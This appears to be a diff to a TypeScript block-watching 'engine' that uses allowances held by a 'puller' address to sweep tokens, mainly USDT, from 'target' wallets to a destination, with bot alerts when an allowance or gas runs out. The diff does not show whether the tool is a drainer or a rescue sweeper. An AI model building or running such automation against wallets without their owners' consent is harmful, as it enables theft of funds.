@@ -17,6 +17,9 @@ const inflight = new Set<string>();
 const lastFired = new Map<string, number>();
 const sessionOk = new Map<string, number>();
 const lastBal = new Map<string, bigint>();
+const orphanWarned = new Set<string>();
+
+export const engineState = { armed: false, targets: 0, blocks: 0, lastBlock: 0, startedAt: 0 };
 
 const COOLDOWN_MS = 1_500;
 const MAX_TRIES = 3;
@@ -27,7 +30,17 @@ async function refresh() {
     const rows = await listActive();
     cache.clear();
     for (const r of rows) cache.set(r.target, r);
-    console.log(`[engine] ${cache.size} target(s)`);
+    engineState.targets = rows.length;
+
+    for (const r of rows) {
+      if (!r.puller) {
+        if (!orphanWarned.has(r.target)) {
+          orphanWarned.add(r.target);
+          console.log(`[engine] SKIP ${r.target} — no puller, run /repair`);
+          await notify(r.userId, `⚠️ \`${r.target}\` has no puller and is being skipped.\nSend \`/repair ${r.target} ${r.destination}\``);
+        }
+      } else orphanWarned.delete(r.target);
+    }
   } catch (e: any) { console.error('[engine] refresh', e.message); }
 }
 
@@ -37,11 +50,9 @@ async function checkAllowances(t: Target) {
     try {
       const ok = (await allowanceOf(t.target, t.puller, tok.token)) > 0n;
       if (ok !== tok.allowanceOk) {
-        await setAllowanceOk((tok as any).id, ok);
-        if (!ok) {
-          await notify(t.userId,
-            `⚠️ Allowance gone: \`${tok.token}\` on \`${t.target}\`.\nPuller: \`${t.puller}\`\nRe-approve.`);
-        }
+        await setAllowanceOk(tok.id, ok);
+        if (!ok) await notify(t.userId,
+          `⚠️ Allowance gone: \`${tok.token}\` on \`${t.target}\`.\nPuller: \`${t.puller}\``);
       }
     } catch { /* transient */ }
   }
@@ -63,7 +74,7 @@ async function tryPull(t: Target, token: `0x${string}`) {
         console.error(`[pull ${i}] ${token} ${t.target}: ${m}`);
         if (m.includes('ALLOWANCE_ZERO')) { await checkAllowances(t); return; }
         if (m.includes('PULLER_LOW_GAS')) {
-          await notify(t.userId, `⛽ Puller \`${t.puller}\` out of BNB. Top up.`);
+          await notify(t.userId, `⛽ Puller \`${t.puller}\` out of BNB.`);
           return;
         }
         await new Promise(r => setTimeout(r, 200 * i));
@@ -115,19 +126,23 @@ async function scan(t: Target) {
 }
 
 export async function startEngine() {
+  engineState.startedAt = Date.now();
   await refresh();
   setInterval(refresh, 4_000);
   setInterval(() => { for (const t of cache.values()) void checkAllowances(t); }, 300_000);
 
   let chain: Promise<unknown> = Promise.resolve();
   pub.watchBlocks({
-    onBlock: () => {
+    onBlock: (b) => {
+      engineState.blocks++;
+      engineState.lastBlock = Number(b.number ?? 0);
       chain = chain
         .then(() => Promise.allSettled([...cache.values()].map(t => scan(t))))
         .catch(e => console.error('[cycle]', e.message));
     },
   });
-  console.log('[engine] armed — puller mode');
+  engineState.armed = true;
+  console.log(`[engine] ARMED — ${cache.size} target(s), USDT primary`);
 }
 
 export { gasOf };
